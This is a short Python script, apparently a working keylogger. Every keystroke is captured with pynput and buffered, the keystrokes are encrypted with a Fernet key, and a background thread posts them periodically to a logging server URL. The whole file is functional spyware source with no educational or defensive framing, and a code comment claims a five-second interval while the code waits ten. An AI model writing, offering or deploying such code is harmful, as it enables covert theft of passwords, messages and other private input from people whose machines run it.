import requests
import threading
import time
from pynput import keyboard
from cryptography.fernet import Fernet

# Load encryption key
with open("secret.key", "rb") as f:
    cipher = Fernet(f.read())

buffer = []
server_url = "http://localhost:5000/log"
lock = threading.Lock()

def send_keys_periodically():
    while True:
        time.sleep(10)  # Send every 5 seconds
        with lock:
            if buffer:
                try:
                    data = ",".join(buffer).encode()
                    encrypted = cipher.encrypt(data)
                    requests.post(server_url, json={"data": encrypted.decode()})
                    buffer.clear()
                except Exception as e:
                    print(f"Send error: {e}")

def on_press(key):
    with lock:
        try:
            buffer.append(key.char)
        except AttributeError:
            buffer.append(str(key))

# Start the background sender thread
threading.Thread(target=send_keys_periodically, daemon=True).start()

# Start key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
